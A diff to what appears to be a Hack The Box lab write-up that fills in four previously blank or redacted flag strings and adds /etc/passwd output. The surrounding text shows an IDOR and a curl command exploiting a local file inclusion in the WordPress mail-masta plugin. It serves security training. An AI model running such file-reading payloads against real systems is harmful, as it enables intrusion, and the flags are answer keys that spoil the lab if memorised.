@@ -191,8 +191,9 @@ Changing the `id` parameter from `9` to `4` discloses another user's data, inclu
 **Flag**:
 
 ```
-
+HTB{8f40ecf17f681612246fa5728c159e46}
 ```
+
 ---
 
 ## dev.inlanefreight.local
@@ -247,7 +248,7 @@ Reading the flag:
 **Flag:**
 
 ```
-HTB{REDACTED}
+HTB{57c7f6d939eeda90aa1488b15617b9fa}
 ```
 
 ---
@@ -262,12 +263,12 @@ Navigating to `/explore`:
 
 ![](./vhosts/gitlab/gitlab2.png)
 
-This discloses a new vhost, `shopdev2.inlanefreight.local`, and a flag:
+The flag and a new vhost, `shopdev2.inlanefreight.local`, are discovered.
 
 **Flag:**
 
 ```
-HTB{REDACTED}
+HTB{32596e8376077c3ef8d5cf52f15279ba}
 ```
 
 ---
@@ -305,6 +306,29 @@ The LFI is exploited to read `/etc/passwd`:
 curl "http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
 ```
 
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+```
+
 The same parameter is used to read the flag:
 
 ```bash
@@ -314,7 +338,7 @@ curl "http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/c
 **Flag:**
 
 ```
-HTB{REDACTED}
+HTB{e7134abea7438e937b87608eab0d979c}
 ```
 
 ---
